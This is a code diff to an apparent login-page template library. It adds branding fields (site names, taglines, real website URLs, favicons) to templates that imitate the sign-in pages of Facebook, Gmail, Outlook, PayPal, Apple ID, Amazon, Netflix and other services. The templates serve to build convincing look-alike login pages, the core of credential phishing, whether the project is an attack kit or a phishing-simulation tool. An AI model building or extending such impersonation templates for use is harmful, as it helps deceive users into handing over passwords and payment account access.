@@ -6,6 +6,12 @@ export interface LoginTemplate {
   name: string
   platform: string
   category: 'social' | 'email' | 'ecommerce' | 'streaming' | 'business' | 'payment' | 'other'
+  branding: {
+    siteName: string
+    siteTagline?: string
+    websiteUrl: string
+    faviconUrl: string
+  }
   colors: {
     primary: string
     secondary?: string
@@ -46,6 +52,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Custom Design',
     platform: 'Custom',
     category: 'other',
+    branding: {
+      siteName: '',
+      siteTagline: '',
+      websiteUrl: '',
+      faviconUrl: '',
+    },
     colors: {
       primary: '#ec4899',
       background: '#f3f4f6',
@@ -82,6 +94,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Facebook',
     platform: 'Facebook',
     category: 'social',
+    branding: {
+      siteName: 'Facebook',
+      siteTagline: 'Connect with friends and the world around you',
+      websiteUrl: 'https://www.facebook.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=facebook.com&sz=128',
+    },
     colors: {
       primary: '#1877f2',
       secondary: '#42b72a',
@@ -121,6 +139,11 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Instagram',
     platform: 'Instagram',
     category: 'social',
+    branding: {
+      siteName: 'Instagram',
+      websiteUrl: 'https://www.instagram.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=instagram.com&sz=128',
+    },
     colors: {
       primary: '#0095f6',
       background: '#fafafa',
@@ -159,6 +182,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'X (Twitter)',
     platform: 'X / Twitter',
     category: 'social',
+    branding: {
+      siteName: 'X',
+      siteTagline: 'Happening now',
+      websiteUrl: 'https://twitter.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=twitter.com&sz=128',
+    },
     colors: {
       primary: '#000000',
       background: '#ffffff',
@@ -197,6 +226,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'LinkedIn',
     platform: 'LinkedIn',
     category: 'social',
+    branding: {
+      siteName: 'LinkedIn',
+      siteTagline: 'Welcome back',
+      websiteUrl: 'https://www.linkedin.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=linkedin.com&sz=128',
+    },
     colors: {
       primary: '#0a66c2',
       secondary: '#70b5f9',
@@ -236,6 +271,11 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'TikTok',
     platform: 'TikTok',
     category: 'social',
+    branding: {
+      siteName: 'TikTok',
+      websiteUrl: 'https://www.tiktok.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=tiktok.com&sz=128',
+    },
     colors: {
       primary: '#fe2c55',
       secondary: '#25f4ee',
@@ -275,6 +315,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Pinterest',
     platform: 'Pinterest',
     category: 'social',
+    branding: {
+      siteName: 'Pinterest',
+      siteTagline: 'Welcome to Pinterest',
+      websiteUrl: 'https://www.pinterest.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=pinterest.com&sz=128',
+    },
     colors: {
       primary: '#e60023',
       background: '#ffffff',
@@ -313,6 +359,11 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Snapchat',
     platform: 'Snapchat',
     category: 'social',
+    branding: {
+      siteName: 'Snapchat',
+      websiteUrl: 'https://accounts.snapchat.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=snapchat.com&sz=128',
+    },
     colors: {
       primary: '#fffc00',
       background: '#ffffff',
@@ -351,6 +402,11 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Reddit',
     platform: 'Reddit',
     category: 'social',
+    branding: {
+      siteName: 'reddit',
+      websiteUrl: 'https://www.reddit.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=reddit.com&sz=128',
+    },
     colors: {
       primary: '#ff4500',
       background: '#dae0e6',
@@ -391,6 +447,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Gmail',
     platform: 'Gmail / Google',
     category: 'email',
+    branding: {
+      siteName: 'Google',
+      siteTagline: 'Sign in to continue to Gmail',
+      websiteUrl: 'https://mail.google.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=google.com&sz=128',
+    },
     colors: {
       primary: '#1a73e8',
       secondary: '#5f6368',
@@ -430,6 +492,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Yahoo Mail',
     platform: 'Yahoo',
     category: 'email',
+    branding: {
+      siteName: 'Yahoo',
+      siteTagline: 'Sign in to Yahoo Mail',
+      websiteUrl: 'https://mail.yahoo.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=yahoo.com&sz=128',
+    },
     colors: {
       primary: '#6001d2',
       secondary: '#5b00c4',
@@ -469,6 +537,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Outlook',
     platform: 'Outlook / Microsoft',
     category: 'email',
+    branding: {
+      siteName: 'Microsoft',
+      siteTagline: 'Sign in to your account',
+      websiteUrl: 'https://outlook.live.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=microsoft.com&sz=128',
+    },
     colors: {
       primary: '#0078d4',
       secondary: '#106ebe',
@@ -510,6 +584,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Amazon',
     platform: 'Amazon',
     category: 'ecommerce',
+    branding: {
+      siteName: 'Amazon',
+      siteTagline: 'Sign in',
+      websiteUrl: 'https://www.amazon.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=amazon.com&sz=128',
+    },
     colors: {
       primary: '#ff9900',
       secondary: '#232f3e',
@@ -549,6 +629,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Walmart',
     platform: 'Walmart',
     category: 'ecommerce',
+    branding: {
+      siteName: 'Walmart',
+      siteTagline: 'Sign in or create your account',
+      websiteUrl: 'https://www.walmart.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=walmart.com&sz=128',
+    },
     colors: {
       primary: '#0071ce',
       secondary: '#ffc220',
@@ -588,6 +674,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'eBay',
     platform: 'eBay',
     category: 'ecommerce',
+    branding: {
+      siteName: 'eBay',
+      siteTagline: 'Hello, sign in to get started',
+      websiteUrl: 'https://www.ebay.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=ebay.com&sz=128',
+    },
     colors: {
       primary: '#e53238',
       secondary: '#0064d2',
@@ -629,6 +721,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Netflix',
     platform: 'Netflix',
     category: 'streaming',
+    branding: {
+      siteName: 'Netflix',
+      siteTagline: 'Sign In',
+      websiteUrl: 'https://www.netflix.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=netflix.com&sz=128',
+    },
     colors: {
       primary: '#e50914',
       secondary: '#b20710',
@@ -668,6 +766,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Spotify',
     platform: 'Spotify',
     category: 'streaming',
+    branding: {
+      siteName: 'Spotify',
+      siteTagline: 'Log in to Spotify',
+      websiteUrl: 'https://www.spotify.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=spotify.com&sz=128',
+    },
     colors: {
       primary: '#1db954',
       background: '#000000',
@@ -706,6 +810,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Hulu',
     platform: 'Hulu',
     category: 'streaming',
+    branding: {
+      siteName: 'Hulu',
+      siteTagline: 'Log In',
+      websiteUrl: 'https://www.hulu.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=hulu.com&sz=128',
+    },
     colors: {
       primary: '#1ce783',
       background: '#0b0c0f',
@@ -746,6 +856,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'PayPal',
     platform: 'PayPal',
     category: 'payment',
+    branding: {
+      siteName: 'PayPal',
+      siteTagline: 'Log in to your account',
+      websiteUrl: 'https://www.paypal.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=paypal.com&sz=128',
+    },
     colors: {
       primary: '#0070ba',
       secondary: '#003087',
@@ -787,6 +903,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Apple ID',
     platform: 'Apple',
     category: 'business',
+    branding: {
+      siteName: 'Apple',
+      siteTagline: 'Sign in with your Apple ID',
+      websiteUrl: 'https://appleid.apple.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=apple.com&sz=128',
+    },
     colors: {
       primary: '#000000',
       secondary: '#1d1d1f',
@@ -826,6 +948,12 @@ export const LOGIN_TEMPLATES: Record<string, LoginTemplate> = {
     name: 'Dropbox',
     platform: 'Dropbox',
     category: 'business',
+    branding: {
+      siteName: 'Dropbox',
+      siteTagline: 'Sign in',
+      websiteUrl: 'https://www.dropbox.com',
+      faviconUrl: 'https://www.google.com/s2/favicons?domain=dropbox.com&sz=128',
+    },
     colors: {
       primary: '#0061ff',
       background: '#ffffff',
